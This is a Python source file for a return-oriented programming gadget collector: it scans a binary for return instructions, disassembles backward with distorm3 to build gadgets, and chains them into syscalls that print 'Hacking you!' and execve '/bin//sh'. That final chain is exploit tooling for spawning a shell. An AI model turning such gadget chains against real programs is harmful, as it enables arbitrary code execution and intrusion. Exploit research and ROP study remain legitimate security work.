import distorm3
from gadget import *
from instruction import *
from struct import *
from syscall import *
from assembler import *
import hashlib

class GadgetCollector:
    
    def __init__(self, file):
        self.file = file
        self.gadgets = []
    '''
    Find gadgets in file specified at init.
    block_length defines the number of bytes the gadget can consist of. If
    a "gadget-end" if found at index n, the gadget will be of length n.
    ''' 
    def extractGadgets(self, gadget_length, options):
        #try:
            fp = open(self.file, 'rb')
            code = fp.read(1)
            code_offset = 0
            
            while len(code)>0:
                # Is the byte a RET
                if unpack('c', code) == ("\xc3",):
                    
                    gadget_search=code_offset
                    index = 0

                    while True:
                    
                        fp.seek(gadget_search - index)
                        code = fp.read(index + 1)

                        iterable = distorm3.DecodeGenerator(gadget_search - index, code, options)

                        length = 0 # count length of instructions in gadgets.
                        gadget = Gadget()
                        for (offset, size, instruction, hexdump) in iterable:
                            inst = Instruction(hexdump, offset, instruction)
                            
                            if length > gadget_length or not gadget.accepted_instruction(inst):                                
                                break
                            # Add instructions to gadget
                            gadget.add(inst)
                            length+=1

                        if gadget.check():
                            self.gadgets.append(gadget)
                        
                        if length > gadget_length:
                                break

                        index+=1
              
                code_offset+=1  
                fp.seek(code_offset)
                code = fp.read(1) 
            
            assembler = Assembler(self.gadgets)

            syscall = Syscall(assembler)

            #syscall.test('EAX')
            syscall.write("Hacking you!")            
            syscall.execve('/bin//sh')

            #syscall.exit()
                    

        #except Exception as e:
        #    print ('error reading file %s: %s' % (self.file, e))
